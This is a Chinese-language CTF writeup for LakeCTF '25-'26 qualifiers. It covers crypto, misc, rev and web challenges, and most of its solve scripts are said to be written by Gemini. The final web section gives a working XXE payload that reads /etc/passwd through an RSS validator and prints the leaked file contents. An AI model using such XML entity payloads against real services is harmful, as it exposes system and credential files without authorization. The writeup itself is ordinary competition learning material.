---
title: "LakeCTF '25-'26 Quals Writeup"
date: 2025-12-01T12:32:24+08:00
tags:
  - CTF Writeup
---


(用Gemini)做出6道简单题，排名223rd.

冷知识：下面五道题的exp全是gemini写的。

# [Crypto] Guess Flag

侧信道，但是太明显了以至于不需要时间分析。


Vulnerable code:

```python
for char in user_input:
    if char != flag[index]:
        print("Wrong flag!")
        exit()
    index += 1
```

Exp:

```python
from pwn import *

def leak_flag():
    # 定义字符集
    charset = "0123456789"
    flag = ""
    
    # 循环直到找到完整的flag
    while True:
        found = False
        
        # 尝试字符集中的每个字符
        for char in charset:
            try:
                # 连接远程服务
                conn = remote('chall.polygl0ts.ch', 6001)
                
                # 构造payload: 当前已知前缀 + 待测试字符
                payload = flag + char
                
                # 发送payload
                conn.sendline(payload.encode())
                
                # 接收响应
                response = conn.recvall(timeout=2).decode()
                
                # 检查响应中是否包含"Correct"
                if "Correct" in response:
                    flag += char
                    print(f"Found next character: {char}")
                    print(f"Current flag: {flag}")
                    found = True
                    break
                    
            except Exception as e:
                print(f"Error: {e}")
                continue
            finally:
                conn.close()
        
        # 如果没有找到新的字符，可能flag已经完整
        if not found:
            print("No more characters found. Flag might be complete.")
            break
    
    return flag

if __name__ == "__main__":
    final_flag = leak_flag()
    print(f"Final flag: {final_flag}")


# 15392948299929328383828399923990
```

# [Misc] zipbomb

> Have you thought about maybe downloading more RAM? I've heard it helps you get to the bottom of things.

嵌套zip文件，直接嵌套解压即可。

```python
import zipfile
import os

def extract_nested_zip(zip_path, extract_to=None):
    """
    简化版的嵌套zip解压函数
    """
    if extract_to is None:
        extract_to = os.path.dirname(zip_path)
    
    print(f"解压: {zip_path}")
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_to)

        # 删除源文件
        os.remove(zip_path)

        
        # 查找并解压嵌套的zip文件
        for root, dirs, files in os.walk("./"):
            for file in files:
                if file.endswith('.zip'):
                    nested_zip_path = os.path.join(root, file)
                    extract_nested_zip(nested_zip_path)
                    
    except Exception as e:
        print(f"解压失败: {str(e)}")

# 使用示例
if __name__ == "__main__":
    zip_file = input("请输入zip文件路径: ")
    if os.path.exists(zip_file):
        extract_nested_zip(zip_file)
        print("解压完成！")
    else:
        print("文件不存在")



# EPFL{m4yb3_TH3_r3A1_r4M_15_th3_Fr13nd5_w3_m4d3_410ng_th3_w4y}
```


# [Misc] Wordler

Wordle，但是是由多个词拼成的，但是给了一个word_list.txt，可以直接暴力。

```python
import collections
import random
import re

class MultiWordleSolver:
    def __init__(self, pattern_str, word_list_path='word_list.txt'):
        """
        初始化 Solver
        :param pattern_str: 类似 "■■■■■_■■■■■" 的字符串
        :param word_list_path: 单词表路径
        """
        # 解析 pattern，获取每个 slice 的长度
        # 例如 "■■■■■_■■■" -> [5, 3]
        self.slice_lengths = [len(s) for s in pattern_str.split('_')]
        self.num_slices = len(self.slice_lengths)
        
        # 加载单词库
        self.all_words = self._load_words(word_list_path)
        
        # 为每个 slice 初始化候选词列表
        # self.candidates[i] 存储第 i 个 slice 所有可能的单词
        self.candidates = []
        for length in self.slice_lengths:
            if length in self.all_words:
                self.candidates.append(self.all_words[length][:])
            else:
                raise ValueError(f"Word list does not contain words of length {length}")
        
        # 记录必须要包含的字母（用于优化猜测，非强制过滤）
        self.must_contain_global = set()
        # 记录已经确定位置的字母 (用于显示)
        self.confirmed_grid = [["■"] * l for l in self.slice_lengths]

    def _load_words(self, path):
        """加载单词并按长度分组"""
        words_by_len = collections.defaultdict(list)
        try:
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    word = line.strip().upper()
                    if word.isalpha():
                        words_by_len[len(word)].append(word)
        except FileNotFoundError:
            print(f"Error: {path} not found. Please ensure the file exists.")
            exit(1)
        return words_by_len

    def get_guess(self):
        """
        生成猜测。
        策略：从每个 slice 的候选词中选择一个最能排除干扰的词。
        (这里使用简单的随机+频率策略，避免计算全量熵以保证速度)
        """
        guess_parts = []
        for i in range(self.num_slices):
            candidates = self.candidates[i]
            if not candidates:
                print(f"Error: No candidates left for slice {i+1}!")
                return None
            
            # 简单的启发式：优先选择包含尚未确认的高频字母的词
            # 如果候选词很少，直接随机选
            if len(candidates) > 1000:
                guess_parts.append(random.choice(candidates))
            else:
                # 这里的逻辑可以优化为 min-max 策略，但对于多词拼接，随机选通常足够快
                guess_parts.append(random.choice(candidates))
        
        return "_".join(guess_parts)

    def process_feedback(self, guess_str, feedback_str):
        """
        根据反馈更新候选列表
        :param guess_str: 猜测的字符串 (如 "APPLE_PEAR")
        :param feedback_str: 反馈字符串 (如 "gbbby_bbgg")
        """
        # 1. 预处理输入，移除分隔符以便对齐处理
        raw_guess = [c for c in guess_parts(guess_str)] # list of strings
        raw_feedback = [c for c in guess_parts(feedback_str)] # list of strings
        
        # 将输入展平成带索引的结构，方便处理全局约束
        # flat_guess: [('A', 'g', slice_idx, char_idx), ('P', 'y', ...)...]
        flat_info = []
        
        g_parts = guess_str.split('_')
        f_parts = feedback_str.split('_')
        
        if len(g_parts) != len(f_parts):
            print("Error: Feedback length does not match guess length.")
            return

        # 统计本轮猜测中每个字母的反馈情况，用于判断全局 "Black"
        # global_char_stats['A'] = {'g': 1, 'y': 0, 'b': 1}
        global_char_stats = collections.defaultdict(lambda: {'g': 0, 'y': 0, 'b': 0})

        for s_idx, (word, feed) in enumerate(zip(g_parts, f_parts)):
            if len(word) != len(feed):
                print(f"Error: Length mismatch in slice {s_idx+1}.")
                return
            
            for c_idx, (char, color) in enumerate(zip(word, feed)):
                flat_info.append({
                    'char': char,
                    'color': color,
                    's_idx': s_idx,
                    'c_idx': c_idx
                })
                global_char_stats[char][color] += 1
                
                # 更新可视化网格
                if color == 'g':
                    self.confirmed_grid[s_idx][c_idx] = char

        # ==========================
        # 2. 应用过滤逻辑
        # ==========================
        
        # 规则 A: 找出完全不存在的字母 (Global Absent)
        # 如果一个字母在整个猜测中出现过，且全是 Black (没有 Green 或 Yellow)，
        # 则说明该字母在整个目标词中完全不存在。
        absent_chars = set()
        for char, stats in global_char_stats.items():
            if stats['b'] > 0 and stats['g'] == 0 and stats['y'] == 0:
                absent_chars.add(char)
        
        # 规则 B: 遍历每个 Slice，过滤候选词
        for s_idx in range(self.num_slices):
            current_candidates = self.candidates[s_idx]
            new_candidates = []
            
            # 获取当前 slice 对应的具体反馈
            slice_feedback = list(zip(g_parts[s_idx], f_parts[s_idx])) # [('A','g'), ('B','b')...]
            
            for word in current_candidates:
                is_valid = True
                
                # 2.1 全局排除检查
                # 如果词中包含 absent_chars 中的任意字母，则剔除
                # (集合交集运算加速)
                if not absent_chars.isdisjoint(set(word)):
                    continue

                # 2.2 局部位置检查 (Green / Yellow / Black at specific pos)
                for i, (g_char, color) in enumerate(slice_feedback):
                    w_char = word[i]
                    
                    if color == 'g':
                        # Green: 必须匹配
                        if w_char != g_char:
                            is_valid = False
                            break
                    elif color == 'y':
                        # Yellow: 当前位置肯定不是这个字符
                        if w_char == g_char:
                            is_valid = False
                            break
                        # 注意：Yellow 意味着全局存在，但不一定在这个 slice 里，
                        # 所以我们不能强制要求 word 必须包含 g_char。
                        # 它可能在别的 slice 里被满足。
                        
                    elif color == 'b':
                        # Black at this position: 当前位置肯定不是这个字符
                        if w_char == g_char:
                            is_valid = False
                            break
                
                if is_valid:
                    new_candidates.append(word)
            
            self.candidates[s_idx] = new_candidates
            print(f"Slice {s_idx+1}: {len(new_candidates)} candidates remaining.")

    def is_solved(self):
        # 简单判断：如果每个 slice 都只剩 1 个词，或者通过外部循环控制
        # 这里由主循环控制，只要收到全 'g' 即可
        return False

def guess_parts(s):
    """Helper to split by underscore"""
    return s.split('_')

def main():
    print("=== Multi-Wordle Solver ===")
    print("请确保 word_list.txt 在当前目录下。")
    
    pattern = input("请输入 Pattern (例如 ■■■■■_■■■■■): ").strip()
    if not pattern:
        # 默认测试用例
        pattern = "■■■■■_■■■■■" 
    
    try:
        solver = MultiWordleSolver(pattern)
    except Exception as e:
        print(e)
        return

    while True:
        # 1. 生成猜测
        guess = solver.get_guess()
        if not guess:
            print("Solver failed: No words left. Check your input or word list.")
            break
            
        print(f"\nSolver Guess: {guess}")
        
        # 2. 获取反馈
        feedback = input("请输入 Feedback (g=green, y=yellow, b=black, _=sep): ").strip().lower()
        
        # 检查是否成功
        if all(c in ['g', '_'] for c in feedback):
            print(f"Success! The word is {guess}")
            break
            
        # 3. 处理反馈
        solver.process_feedback(guess, feedback)

from pwn import *
import re

def decode_feedback(feedback_str):
    """
    将服务器返回的反馈转换为 g/y/b 格式字符串,依据为ansi颜色码,保留_字符
    假设服务器返回格式为b'\x1b[93mS\x1b[0m\x1b[92mI\x1b[0m\x1b[93mN\x1b[0m\x1b[93mG\x1b[0m\x1b[90mL\x1b[0m\x1b[93mE\x1b[0m_\x1b[93mE\x1b[0m\x1b[93mN\x1b[0m\x1b[93mT\x1b[0m\x1b[93mR\x1b[0m\x1b[93mA\x1b[0m\x1b[90mN\x1b[0m\x1b[93mC\x1b[0m\x1b[90mE\x1b[0m_\x1b[93mR\x1b[0m\x1b[93mI\x1b[0m\x1b[92mC\x1b[0m\x1b[93mH\x1b[0m\x1b[90mA\x1b[0m\x1b[92mR\x1b[0m\x1b[93mD\x1b[0m\x1b[90mS\x1b[0m\x1b[93mO\x1b[0m\x1b[90mN\x1b[0m\n'
    """
    feedback = ""
    parts = feedback_str.decode().split('_')
    for part in parts:
        # 使用正则表达式提取每个字符的颜色码
        matches = re.findall(r'\x1b\[(\d+)m.(?:\x1b\[0m)', part)
        for code in matches:
            code = int(code)
            if code == 92:  # Green
                feedback += 'g'
            elif code == 93:  # Yellow
                feedback += 'y'
            elif code == 90:  # Black/Grey
                feedback += 'b'
        feedback += '_'
    return feedback.rstrip('_')
    


def interact():
    print("=== Multi-Wordle Solver ===")
    print("请确保 word_list.txt 在当前目录下。")
    

    sh = remote('chall.polygl0ts.ch', 6052)

    
    print("请输入 Pattern (例如 ■■■■■_■■■■■): ")
    data = sh.recvuntil(b'------------------------------').decode()
    print(data)
    pattern = re.search('Structure: (.+?)\n', data).group(1)
    print(f'Pattern detected: {pattern}')
    if not pattern:
        # 默认测试用例
        pattern = "■■■■■_■■■■■" 
    
    try:
        solver = MultiWordleSolver(pattern)
    except Exception as e:
        print(e)
        return

    while True:
        # 1. 生成猜测
        guess = solver.get_guess()
        if not guess:
            print("Solver failed: No words left. Check your input or word list.")
            break
            
        print(f"\nSolver Guess: {guess}")
        sh.sendlineafter(b'Your guess: ', guess.encode())
        resp = sh.recvline()
        print(resp.decode())
        
        # 2. 获取反馈
        # feedback = input("请输入 Feedback (g=green, y=yellow, b=black, _=sep): ").strip().lower()
        
        feedback = decode_feedback(resp)
        print(f"Decoded Feedback: {feedback}")

        # 检查是否成功
        if all(c in ['g', '_'] for c in feedback):
            print(f"Success! The word is {guess}")
            # break
            sh.interactive()
            return
            
        # 3. 处理反馈
        solver.process_feedback(guess, feedback)

if __name__ == "__main__":
    interact()


# EPFL{5CR1P71NG_15_CH34T1NG}
```



# [Crypto] The Phantom Menace


没看懂，gemini秒了

chall:

```python
import numpy as np
import json

try:
    from flag import flag
except:
    flag = "redacted_this_is_just_so_that_it_works_and_you_can_test_locally."

m_b = np.array([int(c) for char in flag for c in format(ord(char), '08b')])

# Parameters
q = 3329
n = 512
k = 4
f = np.array([1] + [0]*(n-1) + [1])

assert len(m_b)==n

# ---------- Helper functions ----------
def _small_noise(n, weight=2):
    coeffs = np.zeros(n, dtype=int)
    idx = np.random.choice(n, size=weight, replace=False)
    signs = np.random.choice([-1, 1], size=weight)
    coeffs[idx] = signs
    return coeffs

def _vec_poly_mul(v0, v1):
    def _poly_mul(a, b):
        res = np.convolve(a, b)
        for i in range(n, len(res)):
            res[i - n] = (res[i - n] - res[i]) % q 
        return res[:n] % q
    return sum((_poly_mul(a, b) for a, b in zip(v0, v1))) % q

def encrypt(A, t, m_b, r, e_1, e_2):
    A_T = list(map(list, zip(*A)))
    u = np.array([(mat + err) % q for mat, err in 
         zip([_vec_poly_mul(row, r) for row in A_T], e_1)
         ])
    tr = _vec_poly_mul(t, r)
    m = (m_b * ((q + 1)//2)) % q
    v = (tr + e_2 + m) % q
    return u, v

# ---------- Key generation ----------
A = np.array([np.array([np.random.randint(0, q, n) for _ in range(k)]) for _ in range(k)])
s = np.array([_small_noise(n, n*2//3) for _ in range(k)])
e = np.array([_small_noise(n) for _ in range(k)])
t = np.array([(_vec_poly_mul(row, s) + err) % q for row, err in zip(A, e)])

# ---------- Encryption -------------
r = [_small_noise(n) for _ in range(k)]
e_1 = [_small_noise(n) for _ in range(k)]
e_2 = _small_noise(n)

u, v = encrypt(A, t, m_b, r, e_1, e_2)

# ---------- Saving key ---------------
keys = {
    "s":s.tolist(),
    "u":u.tolist(),
    "v":v.tolist()
}

with open("keys.json", "w") as f:
    f.write(json.dumps(keys))
```

> 这是一个基于格密码（Lattice-based Cryptography）的加密题目，类似于 Kyber 或者 LWE（Learning With Errors）加密体系。
> 
> 你需要利用私钥 $s$ 对密文 $(u, v)$ 进行解密。
> 
> **解密原理**
> 
> 加密过程大致如下：
> 1. 公钥：$t = As + e$
> 2. 密文第一部分：$u = A^T r + e_1$
> 3. 密文第二部分：$v = t^T r + e_2 + m_{scale}$
>    其中 $m_{scale} = m_b \cdot \lceil q/2 \rfloor$。
> 
> 要恢复消息 $m_{scale}$，我们需要计算：
> $$ v - s^T u $$
> 
> 推导如下：
> $$ \begin{aligned} v - s^T u &= (t^T r + e_2 + m_{scale}) - s^T (A^T r + e_1) \\ &= ((As+e)^T r + e_2 + m_{scale}) - (s^T A^T r + s^T e_1) \\ &= (s^T A^T r + e^T r + e_2 + m_{scale}) - s^T A^T r - s^T e_1 \\ &= m_{scale} + (e^T r + e_2 - s^T e_1) \end{aligned} $$
> 
> 由于 $e, r, e_1, e_2, s$ 的系数都很小，括号内的误差项 $(e^T r + e_2 - s^T e_1)$ 远小于 $q/2$。
> 因此，计算结果会接近 $0$（如果比特是0）或者接近 $q/2$（如果比特是1）。



```python
import numpy as np
import json

# ---------- 参数定义 ----------
q = 3329
n = 512
k = 4

# ---------- 核心计算函数 (复用题目逻辑) ----------
def poly_mul(a, b):
    """多项式乘法，模 x^n + 1"""
    # 1. 卷积计算多项式乘积
    res = np.convolve(a, b)
    # 2. 模 x^n + 1 (即 x^n = -1) 归约
    for i in range(n, len(res)):
        res[i - n] = (res[i - n] - res[i]) % q
    return res[:n] % q

def vec_poly_mul(v0, v1):
    """多项式向量的点积"""
    # v0, v1 都是 shape 为 (k, n) 的数组
    poly_sum = np.zeros(n, dtype=int)
    for a, b in zip(v0, v1):
        poly_sum = (poly_sum + poly_mul(a, b)) % q
    return poly_sum

def decrypt_and_solve():
    print("[*] Loading keys from keys.json...")
    try:
        with open("keys.json", "r") as f:
            keys = json.load(f)
    except FileNotFoundError:
        print("[!] Error: keys.json not found.")
        return

    # 将列表转换为 numpy 数组
    s = np.array(keys["s"])  # 私钥
    u = np.array(keys["u"])  # 密文 u
    v = np.array(keys["v"])  # 密文 v

    print("[*] Performing decryption arithmetic: v - s^T * u")
    
    # 1. 计算 s^T * u
    # s 和 u 都是 k 个多项式的向量，进行点积
    s_dot_u = vec_poly_mul(s, u)

    # 2. 计算带噪声的消息 m_noisy = v - s * u
    m_noisy = (v - s_dot_u) % q

    # 3. 解码比特
    # 这里的 m_noisy 包含原始消息 (0 或 ~1665) 加上一些噪声
    # 如果值接近 0 或 q，则比特为 0
    # 如果值接近 q/2，则比特为 1
    
    center = (q + 1) // 2
    recovered_bits = []
    
    for val in m_noisy:
        # 计算到中心点 (q/2) 的距离
        dist_to_center = abs(val - center)
        # 计算到 0 的距离 (考虑循环: min(val, q-val))
        dist_to_zero = min(val, q - val)
        
        if dist_to_center < dist_to_zero:
            recovered_bits.append(1)
        else:
            recovered_bits.append(0)

    print("[*] Decoding bits to string...")
    
    # 4. 将比特流转换为字符串
    flag_chars = []
    # 每8个比特一组
    for i in range(0, len(recovered_bits), 8):
        byte_bits = recovered_bits[i:i+8]
        if len(byte_bits) < 8:
            break
            
        # 将比特列表转为字符串 '010101...' 然后转为整数
        byte_str = "".join(map(str, byte_bits))
        byte_val = int(byte_str, 2)
        
        flag_chars.append(chr(byte_val))

    flag = "".join(flag_chars)
    print(f"\n[+] Recovered Flag: {flag}")

if __name__ == "__main__":
    decrypt_and_solve()
```


# [Crypto] Quantum vernam

同样没看懂，似乎是量子加密有关的

chall:

```python
#!/usr/bin/env -S python3 -u
import os
import numpy as np
from math import sqrt
# no need quantum libraries here, only linear algebra. 
from scipy.stats import unitary_group



def string_to_bits(s): 
    bits = []
    for byte in s:
        for i in range(8):
            bits.append((byte >> (7 - i)) & 1)
    return bits

def bit_to_qubit(bit):
    if bit == 0:
        return np.array([1,0])  # |0>
    else:
        return np.array([0, 1]) # |1>

def encryption(key, message,gate1,gate2,x):
    key_bits = string_to_bits(key)
    message_bits = string_to_bits(message)
    cipher = []
    


    encryption_matrix = np.array([])
    PauliX = np.array([(0,1), (1,0)])
    PauliZ = np.array([(1,0), (0,-1)])

    for k, m in zip(key_bits, message_bits):
        qubit = bit_to_qubit(m)
        qubit = gate1 @ qubit

        if k == 1:
            qubit =  x @ qubit

        qubit = gate2 @ qubit
        cipher.append(qubit)
    return cipher

def measurement(cipher):
    measured_bits = []
    for qubit in cipher:
        prob_0 = qubit[0]*qubit[0].conjugate()

        if np.random.rand() < prob_0:
            measured_bits.append(0)
        else:
            measured_bits.append(1)
    return measured_bits

def bits_to_string(bits):
    bytes_list = []
    for i in range(0, len(bits), 8):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | bits[i + j]
        bytes_list.append(byte)
    return bytes(bytes_list)
    
####################################################################################


FLAG = b"EPFL{FAKEFLAAAAAAAG}}"
n = len(FLAG)
key = os.urandom(n)
x = unitary_group.rvs(2)


print("Welcome to the Quantum Vernam Cipher Encryption! Key and flag have same length, try to break perfect secrecy if you can.")
print("\n")
print('The qubits will be encrypted with the matrix x = ',x)
print("\n")
print("You can apply any gate you want to the qubits before and after measurement as a 2X2 matrix, choose your favorite one :)")
print("\n")
print("Also pls remember that in python, j is the imaginary unit, not i.")
print('\n')
print('Enter coefficients for the first matrix that will be applied BEFORE encryption:')
print('Enter first matrix element:') 
a1 = complex(input())
print('Enter second matrix element:')
b1 = complex(input())
print('Enter third matrix element:')
c1 = complex(input())
print('Enter fourth matrix element:')
d1 = complex(input())

gate1 = np.array([(a1,b1),(c1,d1)])



print('\n')
print('Enter coefficients for the second matrix that will be applied AFTER encryption:')
print('Enter first matrix element:') 
a2 = complex(input())
print('Enter second matrix element:')
b2 = complex(input())
print('Enter third matrix element:')
c2 = complex(input())
print('Enter fourth matrix element:')
d2 = complex(input())

gate2 = np.array([(a2,b2),(c2,d2)])



# vérifie que les matrices sont unitaires
def is_unitary(matrix):
    identity = np.eye(matrix.shape[0])
    return np.allclose(matrix.conj().T @ matrix, identity)


    
assert is_unitary(gate1), "Gate 1 is not unitary!"  
assert is_unitary(gate2), "Gate 2 is not unitary!"


cipher = encryption(key, FLAG,gate1,gate2,x)
measurement_result = measurement(cipher)


print("measurement:", measurement_result)
print(bits_to_string(measurement_result))
```

> 这个加密系统的核心步骤是：
> $$|\psi_{out}\rangle = U_2 \cdot (X^k) \cdot U_1 \cdot |m\rangle$$
> 
> 其中 $m$ 是明文位，$k$ 是密钥位（$0$或$1$），$X$ 是服务器生成的随机幺正矩阵。
> 
> 我们的目标是消除密钥 $k$ 的影响。我们可以利用线性代数中的**本征向量**性质：
> 如果一个向量 $|\lambda\rangle$ 是矩阵 $X$ 的本征向量，那么 $X |\lambda\rangle = \lambda |\lambda\rangle$。因为 $X$ 是幺正矩阵，本征值 $\lambda$ 的模长为1（即只改变相位，不改变概率幅的大小）。
> 
> **攻击策略如下：**
> 
> 1.  **对角化 $X$**：计算 $X$ 的本征分解 $X = V D V^{\dagger}$。其中 $V$ 是由本征向量组成的矩阵，$D$ 是对角矩阵。
> 2.  **设置 Gate 1 ($U_1 = V$)**：我们将计算基（Computational Basis $|0\rangle, |1\rangle$）旋转到 $X$ 的本征基。
>       * 如果你输入 $|0\rangle$，经过 $U_1$ 后变成了 $X$ 的第一个本征向量 $|\lambda_0\rangle$。
>       * 如果你输入 $|1\rangle$，经过 $U_1$ 后变成了 $X$ 的第二个本征向量 $|\lambda_1\rangle$。
> 3.  **加密阶段**：
>       * 如果密钥 $k=0$，矩阵是单位矩阵 $I$，状态不变。
>       * 如果密钥 $k=1$，矩阵是 $X$。由于状态是本征向量，应用 $X$ 仅仅是乘以一个相位因子 $\lambda$。
>       * **关键点**：无论 $k$ 是多少，状态依然保持在同一个本征向量的方向上（只是多了个相位 $e^{i\theta}$）。
> 4.  **设置 Gate 2 ($U_2 = V^{\dagger}$)**：我们将本征基旋转回计算基。
>       * 这会抵消 $U_1$ 的旋转。相位因子在测量概率 $|\langle \psi | \psi \rangle|^2$ 中会被消掉。
> 
> 这样，明文 $m$ 将以 $100\%$ 的概率被还原，密钥 $k$ 完全失效。

Exp:

```python
#!/usr/bin/env python3
from pwn import *
import numpy as np
import re
import math


def parse_matrix_from_output(output_str):
    """
    修复后的解析函数：只提取 [[ ... ]] 之间的内容，避免读取到后续的提示文本。
    """
    try:
        # 1. 定位矩阵的开始和结束
        # Numpy 的二维矩阵以 '[[' 开头，以 ']]' 结尾
        start_index = output_str.find('[[')
        end_index = output_str.find(']]') + 2 # +2 是为了包含 ']]'
        
        if start_index == -1 or end_index == 1:
            log.error("Could not find matrix brackets [[ ]] in output.")
            return None
            
        # 2. 只截取矩阵部分的字符串
        matrix_str = output_str[start_index:end_index]
        log.info(f"Isolated matrix string: {matrix_str}")
        
        # 3. 清洗数据
        # 移除方括号和换行符，将所有非数字/复数符号的字符替换为空格
        clean_str = matrix_str.replace('[', ' ').replace(']', ' ').replace('\n', ' ')
        
        # 4. 使用正则提取复数
        # 这个正则匹配形如: -1.23, 1.23+4.5j, .5j, 1.23j 等格式
        # 注意: 这里的正则假设 numpy 输出的标准格式
        pattern = r"[-+]?[0-9]*\.?[0-9]+(?:[eE][-+]?[0-9]+)?(?:\s*[-+]\s*[0-9]*\.?[0-9]+(?:[eE][-+]?[0-9]+)?j)?j?"
        
        # 稍微放宽一点正则，分别提取实部和虚部可能更稳健，但直接用 split 往往对 numpy 输出足够
        # Numpy 输出通常用空格分隔元素。让我们尝试直接 split 清洗后的字符串，
        # 因为上面的正则在处理 1.e-5 这种科学计数法时容易漏掉边界。
        
        tokens = clean_str.split()
        matrix_elements = []
        
        for token in tokens:
            # 过滤掉空的或者纯粹的符号
            if not token.strip(): 
                continue
                
            # 尝试转换
            try:
                # 移除可能存在的括号 (numpy complex output sometimes has parens)
                val_str = token.replace('(', '').replace(')', '')
                val = complex(val_str)
                matrix_elements.append(val)
            except ValueError:
                continue
        
        # 5. 截断或校验
        # 我们只取前4个元素，以防万一
        if len(matrix_elements) >= 4:
            if len(matrix_elements) > 4:
                log.warning(f"Found {len(matrix_elements)} elements, truncating to first 4.")
            return np.array(matrix_elements[:4]).reshape(2, 2)
        else:
            log.error(f"Failed to parse matrix, only found {len(matrix_elements)} elements: {matrix_elements}")
            return None

    except Exception as e:
        log.error(f"Parsing exception: {e}")
        return None


def solve():
    # 如果是本地文件测试，使用 process(['python3', 'server.py'])
    # r = process(['python3', 'server_name.py']) 
    r = remote('chall.polygl0ts.ch', 6002)

    r.recvuntil(b'matrix x = ')
    
    # 读取矩阵数据，直到下一个提示出现前
    matrix_data = r.recvuntil(b'Enter coefficients', drop=True).decode()
    
    log.info("Received raw matrix data...")
    X = parse_matrix_from_output(matrix_data)
    log.success(f"Parsed Matrix X:\n{X}")

    # --- 核心攻击逻辑 ---
    
    # 1. 计算 X 的本征值和本征向量
    # w 是本征值数组, v 是归一化的本征向量矩阵（列向量为本征向量）
    w, v = np.linalg.eig(X)
    
    # 2. 构造 Gate 1 (U1)
    # 我们希望 U1 * |0> = eigenvector_0
    # 我们希望 U1 * |1> = eigenvector_1
    # np.linalg.eig 返回的 v 矩阵正好满足这一点：第 i 列是对应第 i 个本征值的向量
    gate1 = v
    
    # 3. 构造 Gate 2 (U2)
    # 我们需要逆操作，对于幺正矩阵，逆矩阵等于共轭转置
    gate2 = v.conj().T
    
    # 验证一下数学逻辑 (sanity check)
    assert np.allclose(gate1 @ gate2, np.eye(2)), "Gates are not inverse!"
    assert np.allclose(gate1.conj().T @ gate1, np.eye(2)), "Gate 1 not unitary"

    # --- 发送数据 ---
    
    def send_matrix(matrix):
        # 展平并逐个发送
        flat = matrix.flatten()
        for val in flat:
            # 服务器使用 input() 读取，我们需要发送字符串
            to_send = str(val).replace('(', '').replace(')', '')
            r.sendline(to_send.encode())
            # 消耗掉提示词 "Enter ... matrix element:"
            r.recvuntil(b':')

    log.info("Sending Gate 1 (Eigenvectors)...")
    # 第一次recvuntil已经吃掉了 "Enter coefficients... first matrix element:"
    # 所以直接发送第一个元素
    to_send = str(gate1[0,0]).replace('(', '').replace(')', '')
    r.sendline(to_send.encode())
    
    # 发送剩下的3个元素
    for val in gate1.flatten()[1:]:
        r.recvuntil(b':') # 等待提示
        to_send = str(val).replace('(', '').replace(')', '')
        r.sendline(to_send.encode())

    log.info("Sending Gate 2 (Inverse Eigenvectors)...")
    r.recvuntil(b':') # 等待 "Enter first matrix element:" for gate 2
    
    send_matrix(gate2)

    # --- 获取 Flag ---
    r.recvuntil(b'measurement: ')
    r.recvline() # 跳过列表打印
    flag = r.recvline().strip().decode()
    
    log.success(f"FLAG RECOVERED: {flag}")
    
    r.close()

if __name__ == "__main__":
    solve()

```


# [Rev] dilemma

这倒是自己写的，没用gemini，但是这题也没啥rev的事啊

```python
from pwn import *

global_box_map = [0 for _ in range(105)]

sh  = remote('chall.polygl0ts.ch', 6667)


import re

def list_unknown_boxes():
    unknown_boxes = []
    for i in range(1,101):
        if global_box_map[i] == 0:
            unknown_boxes.append(i)
    return unknown_boxes

def generate_guess(player_num):
    # find which box has player_num
    box_num = -1    
    for i in range(len(global_box_map)):
        if global_box_map[i] == player_num:
            box_num = i
            break

    print(f"Generating guess for player {player_num}, box_num={box_num}")
    unknown_boxes = list_unknown_boxes()
    if box_num == -1:# oh no
        payload= f"""
idk = [{','.join(map(str, unknown_boxes))}]
for box in idk:
    print(box)
EOF
"""
    else:
        payload= f"""
idk = [{','.join(map(str, unknown_boxes[0:min(45, len(unknown_boxes))]))}]
for box_num in idk:
    print(box_num)
print({box_num})
EOF
"""
    print(f"Generated payload:\n{payload}")
    return payload





def line(linedata):
    print(linedata, end='')
    
    #parse "The box 1 contains number 29"
    m = re.match(r"The box (\d+) contains number (\d+)", linedata)
    if m:
        box_num = int(m.group(1))
        number = int(m.group(2))
        global_box_map[box_num] = number
    
    # parse "Provide Python script for player 2 (end with string 'EOF' on its own line):"
    m = re.match(r"Provide Python script for player (\d+) \(end with string 'EOF' on its own line\):", linedata)
    if m:
        player_num = int(m.group(1))
        script=generate_guess(player_num)
        sh.sendline(script)

while True:
    linedata = sh.recvline().decode()
    line(linedata)



# EPFL{wow_such_puzzle_did_you_google_the_solution_or_did_you_just_came_up_with_it?}
```


# [Web] Le Canard du Lac


赛后做出来的。

核心在 https://chall.polygl0ts.ch:8085/rss.php 有一个RSS Feed Validator，可以输入XML让它解析。

当时尝试了一些XXE没注出来（因为我是煞笔，首先最基本的RSS XML结构没遵循）

赛后做的，就当是学习一下XXE了。

首先是一个正常的RSS feed XML：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">

<channel>
  <title>W3Schools Home Page</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>RSS Tutorial</title>
    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
    <description>New RSS tutorial on W3Schools</description>
  </item>
  <item>
    <title>XML Tutorial</title>
    <link>https://www.w3schools.com/xml</link>
    <description>New XML tutorial on W3Schools</description>
  </item>
</channel>

</rss>
```

返回：

> Your feed looks great. Here is what we parsed:
> 
> title: W3Schools Home Page
> 
> description: Free web building tutorials




文件读取：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE rss [

<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">

<channel>
  <title>&xxe;</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
</channel>

</rss>
```

返回：

> Your feed looks great. Here is what we parsed:
> 
> title: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
> 
> description: Free web building tutorials


那这其实就是有回显的 XXE 注入了。

